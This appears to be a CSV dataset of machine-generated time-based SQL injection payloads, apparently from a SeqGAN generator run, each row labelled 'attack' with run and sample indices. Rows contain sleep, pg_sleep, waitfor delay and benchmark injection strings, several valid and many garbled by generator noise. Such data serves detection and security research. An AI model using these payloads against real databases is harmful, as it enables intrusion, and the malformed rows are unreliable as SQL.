label,payload,family,payload_type,method,run_id,sample_index
attack,1%'   )    )    )    or sleep  (  __TIME________TIME_____(    )    )    )    =   select E_______TIME_______TI )__and*e  (  __TIME______)    =    _)  )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,497
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,498
attack,"1'  )   <> 0 waitfor delay '0:0:10'    ,pg_sleep  (  5   )    )    )    )    )    )    )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,499
attack,"sleep  )  sleep,sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,500
attack,"1%""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,501
attack,"1' 1%""  )   rlike sleep  (  5  )   and   (  ""%%g""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,502
attack," )    )    or 4240 from @sleep  (  5873,)  _=    __TIME_____TIME___TIME_____TIME_____TI_____TIME____  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,503
attack,"""  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,504
attack,"1""   )    )    )    or sleep  (  5  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,505
attack,1 where fromus not  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,506
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,507
attack,"1'  'isintegratedsecurityonly'waitfor '0:0:2' sleep  (  ___TIME__  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,508
attack,"sleep  (  ,Me' pg_sleep  (  3114",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,509
attack,1%'   )    )    )    )    )    or Eu___  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,510
attack, )    )    or sleep  (  ___  select --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,511
attack,1')    )    )    waitfor and 2388  =    (  select  9443 from   )    (  7260 from sleep  5  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,512
attack,1' where 5702  =lrph where 8036  =  select eldn  =  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,513
attack,' pg_sleep  =_  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,514
attack,; if not  (  sleep  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,515
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "" elt  (  select sleep  (  __TIME__  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,516
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%"" waitfor delay '0:0:__TIME__''0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,517
attack, )    )    and pg_sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,518
attack,; where =    ____TIME__  5  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,519
attack,; if not  (  ___)    (  TIME____TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,520
attack," ,waitfor delay 8781 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,521
attack,"sleep  __)    ,ME________  )    =  sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,522
attack,"1%select%""  )   rlike sleep  (  5  )   and   (  ""%""  =  "" f",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,523
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,524
attack,"zo"" like ""cnedoedonceno where 9862  =      =    )  )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,525
attack,or sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,526
attack," )    )    =lzo zp where 9862  =  select sleep   (  ___TIME___,__TIME_____(    ____TIME____TIME___(  select --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,527
attack,"1'||  (  select 'tf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,528
attack,1'  )   <> waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,529
attack,or pg_sleep  (  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,530
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  )   rlike sleep  (  5  )   and   (  ""%""  =  ""'   )    )    )    or elt  (  3114  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,531
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,532
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%waitfor%"" or * from * from__)    =  sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,533
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,534
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%"" or 4240 from   (  select sleep  (  )  )     ,sleep  (  _____TIME_____TIM___TIME____  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,535
attack,q or select or sleep   (  __TIME___TIME_____T__TIME__)  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,536
attack,"1%""   )    )    )    or' from e or sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,537
attack,6784_TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,538
attack,"1"" or sleep  (  sleep  (  __TIME___  __TIME_____TIME__  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,539
attack,"1""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,540
attack, )    )    or sleep  (  5  )     )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,541
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,542
attack,""" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,543
attack,1'  )   where 5702  =    )    )    )    =    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,544
attack,""" or or benchmark  (  5   )    )    )    )    )    )    )    )    or sleep  __  )    )    )    __    __TIME_____TIME_____TIME____(    (  select information_schemaE__TIME___  )    __TIME_____  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,545
attack,1% fzo or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,546
attack,"1%""   )    _)    )    or 4240    (  select or sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,547
attack,"$ pg_sleep  )  )     ,sleep  (  substring   )    )    )    )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,548
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""% g$ or elt  )  ,25,1  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,549
attack,"1%""  )   rlike sleep  (  5  )   and   (  """"  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cnidoned",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,550
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""l%b""  )   rlike sleep  (  5  )   and   (  ""%bfa;waitfor delay '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,551
attack,", if s not  (  select   )   select from 8514  =  select 2388  =  benchmark  (  )    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,552
attack,"1"" or sleep  (  __TIME______TIME____TIME____TIME_____TIME__  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,553
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""c where 6456  =  6784 or *  (  select e sleep  (  substring   )    )    )    )    __TIME_________TIME______TIME_____TIME  ___TIMDueEq,MD5  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,554
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,555
attack,; or elt  3114  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,556
attack,"""   )    )    )    )    )    and    (    )    )    )    )    and    or benchmark  (  ____TIME__  )    then)   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,557
attack, or benchmark  (  ___TIME________TIME_____TIME__  )    )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,558
attack,   )    )    )    )    ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,559
attack,1 where 6784 fromu or emt delayusduarl where 3885  =    __TIME_______TIME_____TIME___________TIME___TIME(_____TIME______TIME______TIME____TIME____TIME____TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,560
attack,"   )    )    <> 'sa' v *E__TI,E__  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,561
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,562
attack,' waitfor delay '0)    )    )    )    )    )    )    )    )    )    )    or1361 sleep  sleep  (  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,563
attack,"vcq,waitfor delay from pg_sleep  (  5   )    )    )    )    )    )    )    )    or 4240  =    (    )    )    )        )    )    or 8140  (  sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,564
attack,1'   )    )    or or benchmark  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,565
attack,"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""fwcact",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,566
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""beo"" like "" where 5702  )    )  ,waitfor from 8594  (  benchmark  (  5   )    )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,567
attack,1%%'   )    )    )    or pg_sleep  (  substring   (    )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,568
attack,"1%select%"" waitfor or sleep  (  ___)    )    =    ____TIME_____TIME__TIME__  (  sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,569
attack,1'  )   )    )    or sleep  (  5   )    )    )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,570
attack,"1%""  )   rlike sleep  (  5  )   and   (  """"  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,571
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%"" and 4240 from pg_sleep  )   9443* sleep  (  __TIME_____TIME_____TIME__  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,572
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,573
attack,1'||  (  select 'kojx'  (  )   waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,574
attack,or sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,575
attack,1'||  (  select 'kojx' elr  8140 pg_sleep  =  _____TIMD5  (  sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,576
attack,1   )    )    )   <> 0  )    )    )   end   )    )    )    )    )    )    )    )   end   )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,577
attack,1'  'isintegratedsecurityonly'   )    )    )    )    and    =    )    )    )    )    or elt  (  3114  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,578
attack,"1'  )   end1 @v where 1361 6784  =  ' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'   )    =    )    )    )    )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,579
attack,donand pg_sleep 50  )    __TIME__  )   4240 sleep  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,580
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""c not  )  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,581
attack,1'  )   )    )    and  9443 froms --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,582
